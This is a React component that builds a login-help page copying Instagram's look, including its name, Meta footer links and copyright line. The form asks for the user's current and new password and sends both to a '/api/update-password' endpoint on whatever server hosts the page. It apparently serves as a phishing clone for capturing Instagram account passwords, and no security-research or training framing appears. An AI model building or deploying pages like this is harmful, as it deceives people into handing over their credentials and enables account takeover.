import { useState, useEffect } from "react";
import { FaLock } from "react-icons/fa"; // Using react-icons for the lock icon

export default function UpdatePassword() {
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [message, setMessage] = useState("");
  const [successMessage, setSuccessMessage] = useState(""); // Success message state
  const [loading, setLoading] = useState(false); // To track loading state

  useEffect(() => {
    document.body.style.backgroundColor = "#000";
    document.documentElement.style.backgroundColor = "#000";
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Set loading to true when request is made

    // Reset messages before making the request
    setSuccessMessage("");
    setMessage("");

    const response = await fetch("/api/update-password", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ currentPassword, newPassword }),
    });

    const result = await response.json();

    setLoading(false); // Set loading to false after request completes

    if (response.ok) {
      // Assuming the backend returns success in the result object
      setSuccessMessage("Password updated successfully!");
    } else {
      setMessage(result.message || "An error occurred. Please try again.");
    }
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
      {/* Header */}
      <header
        style={{
          display: "flex",
          justifyContent: "flex-start",
          alignItems: "center",
          padding: "20px",
          color: "#fff",
          fontFamily:
            "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", // Applying Segoe UI font
          fontSize: "28px",
          fontWeight: "bold",
          borderBottom: "1px solid #333",
          marginLeft: "10px",
        }}
      >
        Instagram
      </header>

      {/* Main Content */}
      <main
        style={{
          flex: 1,
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          padding: "20px",
          marginTop: "11px",
        }}
      >
        <div
          style={{
            width: "350px",
            backgroundColor: "#262626",
            padding: "30px",
            borderRadius: "12px",
            textAlign: "center",
            boxShadow: "0 4px 12px rgba(0, 0, 0, 0.5)",
          }}
        >
          {/* Lock Icon */}
          <div
            style={{
              backgroundColor: "#333",
              width: "50px",
              height: "50px",
              borderRadius: "50%",
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              margin: "0 auto 20px auto",
            }}
          >
            <FaLock size={24} color="#fff" />
          </div>

          <h2 style={{ color: "#fff", fontSize: "20px", marginBottom: "20px" }}>
            Trouble logging in?
          </h2>

          <p style={{ color: "#8e8e8e", marginBottom: "20px", fontSize: "14px" }}>
            Enter your current and new password to update.
          </p>

          <form onSubmit={handleSubmit}>
            {/* Current Password */}
            <div style={{ marginBottom: "15px" }}>
              <input
                type="password"
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
                placeholder="Current Password"
                style={{
                  width: "80%",
                  padding: "12px",
                  backgroundColor: "#333",
                  border: "1px solid #8e8e8e",
                  borderRadius: "4px",
                  color: "#fff",
                }}
              />
            </div>
            {/* New Password */}
            <div style={{ marginBottom: "15px" }}>
              <input
                type="password"
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="New Password"
                style={{
                  width: "80%",
                  padding: "12px",
                  backgroundColor: "#333",
                  border: "1px solid #8e8e8e",
                  borderRadius: "4px",
                  color: "#fff",
                }}
              />
            </div>
            <button
              type="submit"
              style={{
                width: "87%",
                padding: "12px",
                backgroundColor: "#0095f6",
                color: "#fff",
                border: "none",
                borderRadius: "4px",
                fontWeight: "bold",
                cursor: "pointer",
              }}
              disabled={loading} // Disable button during loading
            >
              {loading ? "Updating..." : "Update Password"}
            </button>
          </form>

          {/* Success or Error Message */}
          {successMessage && (
            <p style={{ color: "green", marginTop: "10px", fontSize: "14px" }}>
              {successMessage}
            </p>
          )}
          {message && (
            <p style={{ color: "red", marginTop: "10px", fontSize: "14px" }}>
              {message}
            </p>
          )}

          <div style={{ marginTop: "20px" }}>
            <a
              href="#"
              style={{ color: "#ffff", textDecoration: "none", fontSize: "14px" }}
            >
              Can't reset your password?
            </a>
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              marginTop: "20px",
              marginBottom: "20px",
            }}
          >
            <div
              style={{
                flex: 1,
                height: "1px",
                backgroundColor: "#8e8e8e",
              }}
            ></div>
            <span
              style={{
                margin: "0 10px",
                color: "#8e8e8e",
                fontSize: "14px",
              }}
            >
              OR
            </span>
            <div
              style={{
                flex: 1,
                height: "1px",
                backgroundColor: "#8e8e8e",
              }}
            ></div>
          </div>

          <div style={{ marginTop: "10px" }}>
            <a
              href="#"
              style={{ color: "#fff", textDecoration: "none", fontSize: "14px" }}
            >
              Create new account
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer
        style={{
          color: "#8e8e8e",
          fontSize: "12px",
          textAlign: "center",
          padding: "20px 10px",
        }}
      >
        <div style={{ marginBottom: "10px" }}>
          Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads · Contact
          Uploading & Non-Users · Meta Verified
        </div>
        <div style={{ marginTop: "10px" }}>
          <span>English · </span>
          <span>© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
